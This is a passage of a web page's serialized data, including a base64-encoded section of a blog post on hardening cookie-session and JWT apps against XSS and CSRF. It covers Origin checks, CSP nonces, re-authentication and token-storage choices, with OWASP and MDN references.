JlcS5tZXRob2QgPT09ICdQT1NUJyAmJiByZXEuaGVhZGVycy5vcmlnaW4gIT09ICdodHRwczovL2JhbmsuY29tJykgcmV0dXJuIHJlcy5zdGF0dXMoNDAzKS5lbmQoKQpgYGAKCioqNi4gUmUtYXV0aCBvbiB0aGUgZGFuZ2Vyb3VzIHN0dWZmLioqIFRyYW5zZmVyIG1vbmV5LCBjaGFuZ2UgZW1haWwsIGRlbGV0ZSBhY2NvdW50OiByZS1lbnRlciBwYXNzd29yZCBvciB0YXAgYSBoYXJkd2FyZSBrZXkuIFRoZSBvbmx5IGxheWVyIHRoYXQgc3RpbGwgaG9sZHMgaWYgWFNTIGdldHMgaW4uCgo8L2RldGFpbHM+Cgo8ZGV0YWlscz4KPHN1bW1hcnk+SGFyZGVuIGEgSldUIGFwcCwgZm91bmRhdGlvbiBmaXJzdDwvc3VtbWFyeT4KCkRvIHRoZSBmb3VuZGF0aW9uIGJlZm9yZSB5b3UgdG91Y2ggdGhlIHRva2VuLiBFdmVyeXRoaW5nIGFib3V0IHdoZXJlIHRoZSB0b2tlbiBsaXZlcyAoQSwgQiwgQyBiZWxvdykgb25seSBsaW1pdHMgdGhlIGRhbWFnZSBvbmNlIFhTUyBpcyBhbHJlYWR5IGluLiBPbmUgbGF5ZXIga2VlcHMgWFNTIG91dCBpbiB0aGUgZmlyc3QgcGxhY2UsIHNvIGl0IGNvbWVzIGZpcnN0LgoKKipELiBUaGUgZm91bmRhdGlvbjogc3RvcCBYU1MgZnJvbSBydW5uaW5nIGF0IGFsbC4qKiBDU1Agbm9uY2UsIGZyYW1ld29yayBhdXRvLWVzY2FwZSwgbm9zbmlmZiwgYW5kIHJlLWF1dGggb24gc2Vuc2l0aXZlIG9wcy4gQSB0b2tlbiBzaXR0aW5nIGluIGBsb2NhbFN0b3JhZ2VgIGJlaGluZCBzb2xpZCBDU1AgY2FuIGJlIHNhZmVyIHRoYW4gYSBwZXJmZWN0bHkgcGxhY2VkIHRva2VuIHdpdGggbm8gQ1NQLCBiZWNhdXNlIHRoZSBzZWNvbmQgYXBwIHN0aWxsIGxldHMgaW5qZWN0ZWQgc2NyaXB0IHJ1bi4gVGhpcyBpcyB0aGUgb25lIGxheWVyIHRoYXQga2VlcHMgdGhlIGF0dGFja2VyIG91dCBpbnN0ZWFkIG9mIGp1c3QgbGltaXRpbmcgdGhlIGRhbWFnZS4KCmBgYApDb250ZW50LVNlY3VyaXR5LVBvbGljeTogc2NyaXB0LXNyYyAnc2VsZicgJ25vbmNlLVJBTkRPTScKWC1Db250ZW50LVR5cGUtT3B0aW9uczogbm9zbmlmZgpgYGAKClRoZW4gY2hvb3NlIHdoZXJlIHRoZSB0b2tlbiBsaXZlcy4gVGhlc2UgYXJlIGxldHRlcmVkLCBub3QgbnVtYmVyZWQgbGlrZSB0aGUgY29va2llIGxhZGRlciBhYm92ZSwgYmVjYXVzZSB5b3UgcGljayBvbmUsIG5vdCBhbGw6IEEsIEIsIGFuZCBDIGFuc3dlciB0aGUgc2luZ2xlIHF1ZXN0aW9uIG9mIHdoZXJlIHRoZSB0b2tlbiBzaXRzLCBhbmQgZWFjaCByZXBsYWNlcyB0aGUgb25lIGJlZm9yZS4gUGljayB0aGUgZnVydGhlc3QgeW91IGNhbiByZWFjaC4KCioqQS4gVG9rZW4gaW4gYGxvY2FsU3RvcmFnZWAuKiogVGhlIHdvcnN0LiBPbmUgWFNTIGxpbmUgc3RlYWxzIGl0LCBhbmQgaXQgcmVwbGF5cyBmcm9tIGFueSBkZXZpY2UgdW50aWwgZXhwaXJ5LgoKYGBganMKbG9jYWxTdG9yYWdlLnNldEl0ZW0oJ3Rva2VuJywgand0KSAgIC8vIGRvbid0CmBgYAoKKipCLiBUb2tlbiBpbiBtZW1vcnkuKiogQSBtb2R1bGUgdmFyaWFibGUgb3Igc3RvcmUsIG5ldmVyIHBlcnNpc3RlZC4gSXQgZGllcyB3aGVuIHRoZSB0YWIgY2xvc2VzLCBzbyBhIHN0b2xlbiBjb3B5IGRvZXNuJ3Qgb3V0bGl2ZSB0aGUgc2Vzc2lvbi4gWFNTIGNhbiBzdGlsbCByZWFkIGl0IHdoaWxlIHRoZSB0YWIgaXMgb3Blbi4gUmVwbGFjZXMgQS4KCmBgYGpzCmxldCBhY2Nlc3NUb2tlbiA9IG51bGwKZnVuY3Rpb24gc2V0VG9rZW4odCkgeyBhY2Nlc3NUb2tlbiA9IHQgfQpgYGAKCioqQy4gU2hvcnQtbGl2ZWQgYWNjZXNzIHRva2VuIGluIG1lbW9yeSwgcmVmcmVzaCB0b2tlbiBpbiBhbiBgSHR0cE9ubHlgIGNvb2tpZS4qKiBUaGUgYWNjZXNzIHRva2VuIGxpdmVzIDUtMTUgbWluIGluIGEgbWVtb3J5IHZhcmlhYmxlOyB0aGUgcmVmcmVzaCB0b2tlbiBnb2VzIHNvbWV3aGVyZSBKUyBjYW4gbmV2ZXIgcmVhZC4gQSBzdG9sZW4gYWNjZXNzIHRva2VuIGV4cGlyZXMgaW4gbWludXRlcywgYW5kIHRoZSB2YWx1YWJsZSBsb25nLWxpdmVkIGNyZWRlbnRpYWwgc3RheXMgb3V0IG9mIHJlYWNoLiBSZXBsYWNlcyBCLgoKYGBgClNldC1Db29raWU6IHJlZnJlc2g9Li4uOyBIdHRwT25seTsgU2VjdXJlOyBTYW1lU2l0ZT1TdHJpY3Q7IFBhdGg9L2F1dGgvcmVmcmVzaApgYGAKCmBgYGpzCi8vIHNpbGVudCByZWZyZXNoLCB0aGUgYnJvd3NlciBzZW5kcyB0aGUgcmVmcmVzaCBjb29raWUgb24gaXRzIG93bgpjb25zdCByZXMgPSBhd2FpdCBmZXRjaCgnL2F1dGgvcmVmcmVzaCcsIHsgY3JlZGVudGlhbHM6ICdpbmNsdWRlJyB9KQphY2Nlc3NUb2tlbiA9IChhd2FpdCByZXMuanNvbigpKS5hY2Nlc3NUb2tlbgpgYGAKClRoZSByZWZyZXNoIGNvb2tpZSBhdXRvLWF0dGFjaGVzLCBzbyBgL2F1dGgvcmVmcmVzaGAgaGFzIGEgQ1NSRiBzdXJmYWNlIG9mIGl0cyBvd24uIGBTYW1lU2l0ZT1TdHJpY3RgIG9uIHRoYXQgb25lIGNvb2tpZSBjbG9zZXMgaXQuIFlvdSd2ZSBzaHJ1bmsgQ1NSRiBmcm9tIHRoZSB3aG9sZSBhcHAgdG8gYSBzaW5nbGUgZW5kcG9pbnQuCgpUaGUgc3Ryb25nZXN0IEpXVCBhcHAgaXMgRCBwbHVzIEM6IGtlZXAgWFNTIG91dCwgYW5kIGlmIGl0IGV2ZXIgZ2V0cyBpbiwgbWFrZSB0aGUgdG9rZW4gaXQgY2FuIHJlYWNoIGV4cGlyZSBpbiBtaW51dGVzLiBObyBDU1JGIHRva2VuIGlzIG5lZWRlZCB3aGlsZSBhdXRoIHN0YXlzIGluIHRoZSBoZWFkZXIsIHNpbmNlIHRoZSBKV1QgZG9lc24ndCBhdXRvLWF0dGFjaC4gQW55IHJvdXRlIHN0aWxsIG9uIGNvb2tpZSBhdXRoIGlzIGEgY29va2llIGFwcCwgZGVmZW5kIGl0IGFzIG9uZS4KCjwvZGV0YWlscz4KCi0tLQoKIyMgUmVmZXJlbmNlcwoKLSBbT1dBU1AgWFNTIFByZXZlbnRpb24gQ2hlYXQgU2hlZXRdKGh0dHBzOi8vY2hlYXRzaGVldHNlcmllcy5vd2FzcC5vcmcvY2hlYXRzaGVldHMvQ3Jvc3NfU2l0ZV9TY3JpcHRpbmdfUHJldmVudGlvbl9DaGVhdF9TaGVldC5odG1sKQotIFtPV0FTUCBDU1JGIFByZXZlbnRpb24gQ2hlYXQgU2hlZXRdKGh0dHBzOi8vY2hlYXRzaGVldHNlcmllcy5vd2FzcC5vcmcvY2hlYXRzaGVldHMvQ3Jvc3MtU2l0ZV9SZXF1ZXN0X0ZvcmdlcnlfUHJldmVudGlvbl9DaGVhdF9TaGVldC5odG1sKQotIFtDb250ZW50IFNlY3VyaXR5IFBvbGljeSAoTUROKV0oaHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWIvSFRUUC9DU1ApCi0gW1NhbWVTaXRlIGNvb2tpZXMgZXhwbGFpbmVkICh3ZWIuZGV2KV0oaHR0cHM6Ly93ZWIuZGV2L2FydGljbGVzL3NhbWVzaXRlLWNvb2tpZXMtZXhwbGFpbmVkKQotIFtUcnVzdGVkIFR5cGVzICh3ZWIuZGV2KV0oaHR0cHM6Ly93ZWIuZGV2L2FydGljbGVzL3RydXN0ZWQtdHlwZXMpCg==9:["$","div",null,{"id":"root","children":["$","div",null,{"id":"main","className":"reading","children":["$","$L14",null,{"htmlContent":"$15","rawContent":"$16","base64Content":"$17","title":"XSS and CSRF: a locked door and open windows","createdAt":"$undefined","updatedAt":"$undefined","tags":["security","xss","csrf","web","cookie"],"altHtmlContent":"$undefined","currentLang":"$undefined","altLang":"$undefined"}]}]}]
+d:{"metadata":[["$","title","0",{"children":"XSS and CSRF: a locked door and open windows  | jialinhuang"}],["$","meta","1",{"name":"description","content":"XSS and CSRF break different things and live in different layers. Defenses scatter across client, server, and browser. Here's the split, plus step-by-step hardening for a cookie-session app and a JWT app."}]],"error":null,"digest":"$undefined"}
+12:"$d:metadata"
